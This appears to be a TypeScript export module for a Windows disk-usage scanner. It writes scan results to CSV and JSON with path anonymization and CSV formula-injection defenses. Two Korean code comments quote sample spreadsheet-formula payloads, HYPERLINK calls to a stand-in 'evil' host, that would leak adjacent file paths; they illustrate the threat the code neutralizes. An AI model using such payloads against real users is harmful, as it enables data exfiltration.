import {
  CategoryStat,
  EXT_RESIDUAL_KEY,
  ScanNode,
  ScanResult,
  categoryLabel,
  extLabel,
  isFileNode,
  truncateReasonOf,
  truncatedBytesOf,
} from "../types";
import { FAILED_KIND_LABELS } from "./notice";
import { History, HistoryEntry } from "./history";

/**
 * CSV 셀 이스케이프 + 수식 인젝션 무력화.
 *
 * 따옴표·쉼표·개행만 이스케이프하면 Excel·Sheets 는 여전히 =,+,-,@ 나 탭·CR 로
 * 시작하는 셀을 수식으로 평가한다. name·path·ext 열의 원천은 스캔한 디스크의
 * 파일명·경로·확장자 — 곧 공격자가 좌우할 수 있는 입력이라, `=HYPERLINK("http://evil",A2)`
 * 라는 이름의 폴더 하나가 인접 셀의 실제 절대 경로를 외부로 반출한다(OWASP CSV
 * Injection). 위험 문자로 시작하는 '문자열' 셀 앞에 작은따옴표를 덧대 트리거를 끊는다.
 *
 * typeof 로 갈라 문자열에만 적용한다 — size_bytes 같은 수치 열은 원시 number 로
 * 실려 이 함수를 거치지 않지만, 혹 `-5` 같은 값이 number 로 넘어와도 무력화되지
 * 않게 한다(name·path·ext·label 은 모두 문자열이라 한꺼번에 덮인다). 프리앰블이
 * 이 규칙과 원본 복원법(선두 ' 제거)을 밝힌다.
 */
function csvCell(value: string | number): string {
  let s = String(value);
  if (typeof value === "string" && /^[=+\-@\t\r]/.test(s)) {
    s = `'${s}`;
  }
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

const HEADER = [
  "path",
  "name",
  "kind",
  "size_bytes",
  "files",
  "depth",
  /*
   * 읽지 못한 서브트리 표식.
   *
   * 없으면 접근이 거부된 디렉터리가 size_bytes=0·files=0·truncated=0 인 행으로 나가,
   * 정말로 비어 있는 폴더와 구별할 방법이 파일 안에 존재하지 않는다. 화면(TreeView)은
   * 이 값으로 ≥ 배지를 붙이는데 엑셀에서 열리는 산출물에만 그 축이 없었다.
   */
  "incomplete",
  "truncated_children",
  "truncated_bytes",
  // 백엔드가 사유를 셋으로 나눠 보내는데 CSV 가 대표 사유 하나로 뭉개면,
  // UI 에서 이미 고친 오기('small 30 + capped 20' → '표시 한도로 50개')를 되살린다.
  "truncated_small",
  "truncated_capped",
  "truncated_deep",
  /*
   * 사유별 생략 '바이트'. 개수만 내보내면 CSV 소비자만 '깊이 절단으로 빠진 용량'과
   * '비중 과소로 빠진 용량'을 구분하지 못한다 — 깊이 절단은 큰 폴더가 통째로 숨는
   * 사유이고 비중 과소는 정의상 작은 것들이라, 합산해 두면 '이 CSV 가 놓친 용량이
   * 어디에 있을 법한가'라는 감사 질문에 답할 수 없다.
   */
  "truncated_bytes_small",
  "truncated_bytes_capped",
  "truncated_bytes_deep",
  "truncate_reason_primary",
];

/** 산출물 종류. 첫 줄이 자기 자신을 정확히 밝혀야 나중에 아카이브에서 구분된다. */
export type ExportKind = "tree" | "category" | "extension" | "failed" | "history";

/**
 * 파일 하나만 놓고도 재해석이 가능해야 한다.
 *
 * 특히 행이 계층적이라는 사실 — 디렉터리 행의 size_bytes 에 하위가 이미 포함되어
 * 있어 SUM(size_bytes) 이 깊이만큼 중복 합산된다는 것 — 을 파일 안에 적지 않으면
 * 하류에서 조용히 틀린 수치가 나온다. 부분 집계·목록 잘림도 마찬가지다: 중단된
 * 스캔의 CSV 가 완전한 스냅샷과 구분되지 않으면 시계열 비교에서 '용량이 크게
 * 줄었다'로 오독된다.
 */
export function csvPreamble(
  result: ScanResult,
  target: string,
  kind: ExportKind = "tree",
  options: ExportOptions = {},
): string[] {
  const p = result.pruneParams;
  const root = result.rootPath ?? target;
  const meta = [
    `# discan ${result.appVersion ?? "0.1.0"} ${kind} export`,
    // 익명화 모드에서는 첫 줄부터 절대 경로가 나가면 안 된다 — 체크박스 라벨이
    // 약속하는 것과 산출물이 다르면 그 통제는 통제로 기능하지 않는다.
    //
    // 값은 스캔 루트 경로 — 곧 공격자가 폴더 이름으로 좌우할 수 있는 입력이다.
    // Windows 경로에는 쉼표가 합법이라 `# target=C:\Report,=HYPERLINK("http://evil",A1)`
    // 같은 루트는 이 줄을 두 셀로 쪼개 둘째 셀 `=HYPERLINK(...)`가 Excel/Sheets 에서
    // 평가된다(#로 시작하는 메타 줄이라도 셀 단위로는 수식이 평가된다). `# key=값`
    // 전체를 한 셀로 감싸(csvCell) 쉼표 분리와 선두 트리거를 함께 끊는다 — `#`로
    // 시작하는 셀은 수식이 아니라 텍스트로 남는다.
    csvCell(`# target=${options.anonymizePaths ? driveOf(root) : root}`),
    `# started_at=${result.startedAt ?? ""} exported_at=${new Date().toISOString()}`,
    // cluster_slack=not_counted 는 total_size_bytes 에 걸리는 조건이다. 아래 allocated_bytes
    // 와 나란히 놓이면 어느 수치의 서술인지 모호해지므로 size_basis 안에 묶어 적는다.
    `# size_basis=${result.sizeBasis ?? "logical"}(cluster_slack_not_counted) dedup=${result.dedup ?? "none"} cloud_placeholders=excluded`,
    /*
     * 총량 차이를 파일만 보고 소명할 수 있어야 한다.
     *
     * allocated_bytes 가 0일 때 그것이 '점유 없음'인지 '클러스터 크기 미상'인지는
     * alloc_basis 로만 갈린다 — 백엔드가 그 구분을 위해 만든 필드가 산출물에서
     * 빠져 있었다. elevated 도 마찬가지다: 같은 볼륨을 관리자/일반 권한으로 두 번
     * 스캔한 두 CSV 의 수 GB 차이를 설명하는 1차 변수인데 화면에만 있었다.
     */
    // file_system 은 OS 가 보고하는 값이라 공격 표면이 좁지만, 프리앰블 스스로
      // '위험 문자로 시작하는 셀은 무력화했다'고 고지하므로 데이터성 값은 예외 없이
      // csvCell 을 거치게 한다(선두 트리거 무력화·쉼표 인용).
    `# allocated_bytes=${result.allocatedEstimate ?? 0} alloc_basis=${result.allocBasis ?? "unknown"}` +
      ` cluster_bytes=${result.clusterBytes ?? 0} file_system=${csvCell(result.fileSystem ?? "")}` +
      ` elevated=${result.elevated ?? "unknown"}`,
    `# total_size_bytes=${result.totalSize} total_files=${result.totalFiles} errors=${result.errors}`,
    `# cancelled=${result.cancelled} skipped_cloud=${result.skippedCloud ?? 0}` +
      ` skipped_cloud_bytes=${result.skippedCloudBytes ?? 0} skipped_links=${result.skippedLinks ?? 0}` +
      ` failed_paths_total=${result.failedPathsTotal ?? result.errors}` +
      ` failed_paths_truncated=${result.failedPathsTruncated ?? false}`,
    // 파일명·경로가 스프레드시트 수식으로 실행되지 않도록 무력화한 사실을 밝힌다.
    // 무력화된 셀은 선두 작은따옴표(')를 지우면 원본이 된다.
    "# NOTE: cells starting with = + - @ tab or CR are prefixed with a single quote (') to disable" +
      " spreadsheet formula execution - strip the leading quote to recover the original value.",
  ];
  if (p) {
    meta.push(`# min_size=${p.minSize} max_depth=${p.maxDepth} max_children=${p.maxChildren}`);
  }
  if (result.cancelled) {
    meta.push("# WARNING: partial scan - totals are lower bounds.");
  }
  if (kind === "tree") {
    meta.push(
      "# NOTE: rows are hierarchical - a dir row already contains its descendants.",
      /*
       * '깊이별' 복원식('SUM(size_bytes at d) + SUM(truncated_bytes at d)')은 틀렸다.
       * 백엔드 불변식이 node.size = (남긴 자식 합) + truncated_bytes 라 truncated_bytes 는
       * 이미 size_bytes 안에 들어 있어, 그 식은 생략분을 이중 계산한다(d=0 만 봐도
       * 총량 + 루트 생략분이 된다). 깊이·파일리프와 무관하게 늘 성립하는 보편식만 남긴다:
       * 각 행의 '자기 잔여'(size_bytes − 직속 자식 size_bytes 합)를 모두 더하면 총량이다
       * (dir 행에서는 truncated_bytes, 파일 행에서는 자기 크기와 같아 정확히 상쇄된다).
       */
      "# NOTE: total = size_bytes of the depth=0 row; or SUM over all rows of" +
        " (size_bytes - sum of direct children's size_bytes).",
      "# NOTE: incomplete=1 rows are lower bounds - subtree unreadable (denied/cancelled/depth).",
      // 세 값의 합이 truncated_bytes 와 다르면 사유가 설명하지 못한 차액이 있다는 뜻이다.
      "# CHECK: truncated_bytes_small + _capped + _deep <= truncated_bytes (difference is unexplained).",
    );
  }
  if (kind === "failed") {
    // 한 디렉터리에서 엔트리 순회가 수십 번 실패해도 목록에는 한 줄만 남는다.
    // 그 사실을 적지 않으면 행 수를 발생 건수로 읽어 감사 결론이 뒤집힌다.
    meta.push(
      "# NOTE: rows are unique (path, kind) pairs - occurrences are folded, see failed_paths_total.",
    );
  }
  return meta;
}

/** 드라이브 문자까지만. 익명화 모드에서 '어느 볼륨인가'는 남기되 위치는 지운다. */
function driveOf(path: string): string {
  const m = /^([A-Za-z]:)/.exec(path ?? "");
  return m ? `${m[1]}\\` : "";
}

/**
 * 경로 변환기. 익명화가 꺼져 있으면 항등 함수다.
 *
 * 예전에는 `includeFailedPaths` 가 꺼졌을 때 실패 경로만 마지막 구성요소로 축약했다.
 * 그런데 같은 파일에 `root`(노드마다 절대 경로)와 `largestFiles`(상위 200개 절대
 * 경로)가 **무조건** 실려, 20~500건이 익명화되고 수천 건이 그대로 나갔다. 사용자는
 * 체크박스를 '경로 원문을 빼는 옵션'으로 읽는데 실제 보호는 거의 없었다.
 * 통제를 실효 있게 만들려면 한 함수를 네 곳에 일괄 적용해야 한다.
 */
function pathMapper(
  result: ScanResult,
  target: string,
  options: ExportOptions,
): (path: string) => string {
  if (!options.anonymizePaths) return (p) => p;
  const root = (result.rootPath ?? target ?? "").replace(/[\\/]+$/, "");
  if (root === "") return (p) => p;
  const lower = root.toLowerCase();
  return (p) => {
    const l = p.toLowerCase();
    if (l === lower) return "<root>";
    if (l.startsWith(`${lower}\\`) || l.startsWith(`${lower}/`)) {
      return `<root>\\${p.slice(root.length).replace(/^[\\/]+/, "")}`;
    }
    // 루트 밖 경로(실패 목록은 부모 디렉터리가 실릴 수 있다)는 볼륨만 남긴다.
    return `${driveOf(p)}…`;
  };
}

/** 트리를 경로만 바꿔 복제한다. JSON 산출물의 root 에도 같은 통제를 걸기 위해서다. */
function mapNodePaths(node: ScanNode, map: (path: string) => string): ScanNode {
  return {
    ...node,
    path: map(node.path),
    children: node.children.map((c) => mapNodePaths(c, map)),
  };
}

/**
 * 트리를 평탄화한 CSV. 표시용 축약값(9.21 GiB)이 아니라 원시 바이트를 싣는다 —
 * 하류 시스템에서 단위 해석이 갈리지 않아야 한다.
 */
export function buildTreeCsv(result: ScanResult, target = "", options: ExportOptions = {}): string {
  const map = pathMapper(result, target, options);
  const rows: string[] = [...csvPreamble(result, target, "tree", options), HEADER.join(",")];

  const walk = (node: ScanNode, depth: number) => {
    rows.push(
      [
        csvCell(map(node.path)),
        csvCell(node.name),
        isFileNode(node) ? "file" : "dir",
        node.size,
        node.files,
        depth,
        node.incomplete === true ? 1 : 0,
        node.truncated,
        truncatedBytesOf(node),
        node.truncatedSmall ?? "",
        node.truncatedCapped ?? "",
        node.truncatedDeep ?? "",
        node.truncatedBytesSmall ?? "",
        node.truncatedBytesCapped ?? "",
        node.truncatedBytesDeep ?? "",
        node.truncated > 0 ? truncateReasonOf(node) : "",
      ].join(","),
    );
    for (const child of node.children) walk(child, depth + 1);
  };

  walk(result.root, 0);
  // BOM 과 CRLF 는 Excel 이 UTF-8 을 제대로 읽게 하는 최소 조건이다.
  return `﻿${rows.join("\r\n")}\r\n`;
}

/**
 * 분야별 집계. 시계열 비교에서 실제로 대조하기 쉬운 축이다.
 *
 * 두 축을 한 파일에 싣는다. 예전에는 힌트 축(result.categories)만 나갔는데, 화면에서
 * '캐시·빌드 산출물 12.8 GiB'의 내부를 되짚는 축이자 확장자 교차 필터가 유일하게
 * 조인을 허용하는 축은 contentCategories(확장자 전용 분류)다 — 가장 분석적으로 쓰이는
 * 축이 엑셀로는 나가지 않았다. axis 열이 없으면 나중에 두 축을 함께 아카이브했을 때
 * 파일명 외에는 구분할 근거가 없으므로 행마다 어느 축인지 밝힌다.
 */
export function buildCategoryCsv(
  result: ScanResult,
  target = "",
  options: ExportOptions = {},
): string {
  const rows: string[] = [
    ...csvPreamble(result, target, "category", options),
    "axis,key,label,size_bytes,files,percent_of_axis",
  ];
  const push = (axis: "hint" | "content", stats: CategoryStat[]) => {
    // 분모는 축 합계다. 두 축의 합계가 다를 수 있어(분류 규칙이 다르다) 총량으로
    // 나누면 한 축의 비중 합이 100%가 되지 않는다.
    const sum = stats.reduce((a, c) => a + c.size, 0);
    for (const c of stats) {
      const pct = sum > 0 ? ((c.size / sum) * 100).toFixed(3) : "0";
      rows.push([axis, csvCell(c.key), csvCell(categoryLabel(c)), c.size, c.files, pct].join(","));
    }
  };
  push("hint", result.categories);
  if (result.contentCategories && result.contentCategories.length > 0) {
    push("content", result.contentCategories);
  }
  return `﻿${rows.join("\r\n")}\r\n`;
}

/**
 * 읽지 못한 경로 목록.
 *
 * 실패 목록은 감사 추적의 1차 자료인데, 지금까지는 JSON 을 읽을 수 있는 소비자에게만
 * 열려 있었다. '이 표가 놓친 용량이 어디에 있는가'라는 질문이 표 산출물만으로
 * 종결되려면 이 파일이 있어야 한다. 총수·잘림 여부는 공통 프리앰블이 담는다.
 */
export function buildFailedPathsCsv(
  result: ScanResult,
  target = "",
  options: ExportOptions = {},
): string {
  const map = pathMapper(result, target, options);
  const rows: string[] = [...csvPreamble(result, target, "failed", options), "path,kind,label"];
  for (const f of result.failedPaths ?? []) {
    rows.push([csvCell(map(f.path)), csvCell(f.kind), csvCell(FAILED_KIND_LABELS[f.kind] ?? f.kind)].join(","));
  }
  return `﻿${rows.join("\r\n")}\r\n`;
}

/**
 * 확장자별 집계. 백엔드가 상위 30개만 보내므로 나머지는 residual 행으로 남긴다.
 * category 열이 있으면 하류에서 분야×확장자 피벗이 바로 만들어진다.
 */
export function buildExtensionCsv(
  result: ScanResult,
  target = "",
  options: ExportOptions = {},
): string {
  /*
   * ext 는 데이터 열이고 label 은 표시 열이다.
   *
   * 예전에는 ext 열에 extLabel() 결과가 들어가 '그 밖의 확장자'·'확장자 없음' 같은
   * 한국어가 키 자리에 실렸다. 백엔드가 EXT_OVERFLOW_KEY/EXT_NONE_KEY 를 ASCII
   * 센티널로 못 박고 테스트까지 둔 이유(하류가 표시 문구를 하드코딩하지 않게 한다)가
   * 마지막 단계에서 무너진 셈이다. 잔여 행도 같은 규칙으로 __residual 키를 쓴다.
   */
  /*
   * kinds(접힌 종수)와 is_other 를 함께 싣는다.
   *
   * kinds 가 없으면 '그 밖의 확장자 1.5 GiB' 한 줄이 소수의 대형인지 롱테일인지
   * 파일만으로 판별되지 않는다. is_other 는 아래 otherExtensions 섹션을 상위 30
   * 목록과 가르는 표식이다 — '기타' 분야의 롱테일 확장자는 정의상 전역 상위 30에
   * 들지 못해, 이 섹션이 없으면 개별 확장자가 확장자 CSV·JSON 어디에도 없어
   * 오프라인 분해·분류표 개선 피드백이 끊긴다(지난 라운드 contentCategories 와 동형).
   */
  const rows: string[] = [
    ...csvPreamble(result, target, "extension", options),
    "ext,label,category,size_bytes,files,percent_of_total,kinds,is_other",
  ];
  const pctOf = (bytes: number) =>
    result.totalSize > 0 ? ((bytes / result.totalSize) * 100).toFixed(3) : "0";
  const exts = result.extensions ?? [];
  let listed = 0;
  for (const e of exts) {
    listed += e.size;
    rows.push(
      [
        csvCell(e.ext),
        csvCell(extLabel(e.ext)),
        csvCell(e.category ?? ""),
        e.size,
        e.files,
        pctOf(e.size),
        e.kinds ?? "",
        0,
      ].join(","),
    );
  }
  const residual = Math.max(0, result.totalSize - listed);
  if (residual > 0) {
    // 목록이 100%를 설명하지 못하면 '나머지는 어디 갔나'를 사용자가 되짚을 수 없다.
    rows.push([EXT_RESIDUAL_KEY, csvCell(extLabel(EXT_RESIDUAL_KEY)), "", residual, "", pctOf(residual), "", 0].join(","));
  }
  /*
   * '기타' 분해용 롱테일 섹션. 이들은 위 상위 30(및 residual)과 별개의 보조 축이라
   * listed 합계에는 더하지 않는다 — 더하면 residual 이 음수가 되거나 총량을 이중
   * 계산한다. is_other=1 로 표식해 소비자가 두 축을 구분하게 한다.
   */
  for (const e of result.otherExtensions ?? []) {
    rows.push(
      [
        csvCell(e.ext),
        csvCell(extLabel(e.ext)),
        csvCell(e.category ?? "other"),
        e.size,
        e.files,
        pctOf(e.size),
        e.kinds ?? "",
        1,
      ].join(","),
    );
  }
  return `﻿${rows.join("\r\n")}\r\n`;
}

export interface ExportOptions {
  /**
   * 볼륨 고유 식별자를 포함할지. 기본은 제외 — 사용자는 '디스크 사용량 보고서'를
   * 기대하고 파일을 지원 채널·이슈 트래커에 첨부하는데, 화면에서 본 적 없는
   * 기기 식별자가 함께 나가는 것은 기대와 어긋난다.
   */
  includeVolumeSerial?: boolean;
  /**
   * 경로를 스캔 루트 기준 상대 경로(`<root>\…`)로 바꿀지.
   *
   * 예전의 '실패 경로 원문 제외'는 failedPaths 만 축약해, 체크박스 라벨이 약속하는
   * 보호와 실제 동작이 어긋났다(root·largestFiles 는 무조건 절대 경로였다).
   * 통제는 모든 경로 채널에 같은 함수를 걸 때만 통제로 기능한다.
   */
  anonymizePaths?: boolean;
}

/** 내보내기 파일에 실리는 항목을 한 줄로 고지한다. 버튼 옆에 그대로 붙인다. */
export function exportDisclosure(options: ExportOptions = {}): string {
  // 고지와 체크박스 라벨이 서로 다른 이야기를 하면 사용자는 어느 쪽도 믿을 수 없다.
  const parts = [
    options.anonymizePaths
      ? "스캔 루트 아래의 상대 경로(절대 경로 제외)"
      : "폴더·파일의 절대 경로",
  ];
  if (options.includeVolumeSerial) parts.push("볼륨 식별 정보");
  return `내보내는 파일에는 ${parts.join(" · ")}가 포함됩니다.`;
}

/**
 * 원본 결과 + 메타데이터. 시계열 비교의 기준이 되므로 스캔 시각과 대상을 함께 남긴다.
 *
 * 필드를 화이트리스트로 열거하는 이유 — 예전에는 result 를 통째로 덤프해서,
 * 백엔드에 필드가 하나 추가되면 그 순간부터 고지 없이 산출물에 실렸다.
 */
export function buildJson(result: ScanResult, target: string, options: ExportOptions = {}): string {
  const failed = result.failedPaths ?? [];
  const map = pathMapper(result, target, options);
  const anon = options.anonymizePaths === true;
  return JSON.stringify(
    {
      app: "discan",
      formatVersion: 4,
      appVersion: result.appVersion,
      // 부분 집계 여부는 최상위에 둔다 — totals 안쪽까지 읽지 않는 소비자가 더 많다.
      partial: result.cancelled,
      // 익명화 여부는 산출물 자체가 밝혀야 한다 — `<root>` 를 못 본 소비자가 경로가
      // 통째로 빠진 것으로 오해하면 감사 결론이 달라진다.
      pathBasis: anon ? "relativeToRoot" : "absolute",
      target: anon ? driveOf(result.rootPath ?? target) : target,
      rootPath: anon ? driveOf(result.rootPath ?? target) : result.rootPath,
      scannedAt: new Date().toISOString(),
      startedAt: result.startedAt,
      basis: {
        sizeBasis: result.sizeBasis ?? "logical",
        dedup: result.dedup ?? "none",
        cloudPlaceholders: "excluded",
        clusterSlack: "notCounted",
        clusterBytes: result.clusterBytes,
        fileSystem: result.fileSystem,
        allocatedEstimate: result.allocatedEstimate,
        // 0 이 '점유 없음'인지 '클러스터 크기 미상'인지는 이 필드로만 갈린다.
        allocBasis: result.allocBasis ?? "unknown",
        // 두 스냅샷의 총량 차이를 소명할 1차 설명 변수. 화면에만 있고 산출물에 없었다.
        elevated: result.elevated,
        pruneParams: result.pruneParams,
        ...(options.includeVolumeSerial ? { volumeSerial: result.volumeSerial } : {}),
      },
      totals: {
        totalSize: result.totalSize,
        totalFiles: result.totalFiles,
        totalDirs: result.totalDirs,
        errors: result.errors,
        dirErrors: result.dirErrors,
        fileErrors: result.fileErrors,
        // 500건 상한에 걸린 목록을 전량으로 오인하면 감사 결론이 뒤집힌다.
        failedPathsTotal: result.failedPathsTotal ?? result.errors,
        failedPathsTruncated: result.failedPathsTruncated ?? false,
        skippedLinks: result.skippedLinks,
        skippedCloud: result.skippedCloud,
        skippedCloudBytes: result.skippedCloudBytes,
        elapsedMs: result.elapsedMs,
        cancelled: result.cancelled,
      },
      categories: result.categories,
      contentCategories: result.contentCategories,
      extensions: result.extensions,
      // '기타' 롱테일 확장자. 상위 30에 정의상 들지 못해 extensions 만으로는
      // 개별 확장자를 오프라인에서 되짚을 수 없다(화이트리스트 누락이었다).
      otherExtensions: result.otherExtensions,
      largestFiles: result.largestFiles?.map((f) => ({ ...f, path: map(f.path) })),
      failedPaths: failed.map((f) => ({ ...f, path: map(f.path) })),
      root: mapNodePaths(result.root, map),
    },
    null,
    2,
  );
}

/**
 * 스캔 이력 표.
 *
 * 이 앱이 만드는 유일한 시계열 자산이 WebView2 프로필의 수명에 묶여 있었다 —
 * 저장은 되는데 반출 수단이 없어 정리 효과를 몇 주에 걸쳐 추적하거나 다른 PC로
 * 옮기는 일이 모두 불가능했다. 경로별 최근 실행을 한 표로 낸다.
 */
export function buildHistoryCsv(history: History, options: ExportOptions = {}): string {
  const rows: string[] = [
    `# discan history export exported_at=${new Date().toISOString()}`,
    "# NOTE: one row per scan run; sizes are logical bytes with the same basis as the run.",
    // 다른 내보내기(csvPreamble)와 같은 수식 인젝션 무력화 고지. 이력 경로에 선두
    // 위험 문자가 있어 작은따옴표가 붙은 경우, 이력 CSV 만 본 감사 소비자도 그 접두어의
    // 근거와 원본 복원법을 알 수 있어야 산출물 간 감사 규칙이 일관된다.
    "# NOTE: cells starting with = + - @ tab or CR are prefixed with a single quote (') to disable" +
      " spreadsheet formula execution - strip the leading quote to recover the original value.",
    // dedup(및 dedup_min_bytes)이 빠지면, 같은 경로를 hardlink/none 으로 각각 스캔한
    // 두 스냅샷의 총량 차이(WinSxS·패키지 캐시가 링크 수만큼 재계수됨)를 내보낸
    // 시계열만으로는 재구성할 수 없어 감사 추적이 끊긴다.
    "path,at,size_bytes,total_files,errors,elevated,size_basis,dedup,dedup_min_bytes,app_version",
  ];
  const anon = options.anonymizePaths === true;
  const runsOf = (entry: HistoryEntry): HistoryEntry[] =>
    entry.runs && entry.runs.length > 0 ? entry.runs : [entry];
  const entries = Object.entries(history).sort((a, b) => a[0].localeCompare(b[0]));
  for (const [path, entry] of entries) {
    for (const run of runsOf(entry)) {
      rows.push(
        [
          csvCell(anon ? driveOf(path) : path),
          csvCell(run.at ?? ""),
          run.size,
          run.totalFiles ?? "",
          run.errors ?? "",
          run.elevated ?? "",
          csvCell(run.sizeBasis ?? ""),
          csvCell(run.dedup ?? ""),
          run.dedupMinBytes ?? "",
          csvCell(run.appVersion ?? ""),
        ].join(","),
      );
    }
  }
  return `﻿${rows.join("\r\n")}\r\n`;
}

export function timestampSlug(date = new Date()): string {
  const pad = (n: number) => String(n).padStart(2, "0");
  return (
    `${date.getFullYear()}${pad(date.getMonth() + 1)}${pad(date.getDate())}` +
    `-${pad(date.getHours())}${pad(date.getMinutes())}`
  );
}

/** WebView2 의 다운로드 경로를 그대로 쓴다. 파일 쓰기 권한을 앱에 열지 않기 위해서다. */
export function downloadText(filename: string, text: string, mime: string): void {
  const blob = new Blob([text], { type: `${mime};charset=utf-8` });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  // 즉시 해제하면 일부 웹뷰에서 다운로드가 취소된다.
  setTimeout(() => URL.revokeObjectURL(url), 10_000);
}

export async function copyText(text: string): Promise<boolean> {
  try {
    await navigator.clipboard.writeText(text);
    return true;
  } catch {
    // 클립보드 API 가 막힌 환경을 위한 최후 수단.
    try {
      const ta = document.createElement("textarea");
      ta.value = text;
      ta.style.position = "fixed";
      ta.style.opacity = "0";
      document.body.appendChild(ta);
      ta.select();
      const ok = document.execCommand("copy");
      ta.remove();
      return ok;
    } catch {
      return false;
    }
  }
}
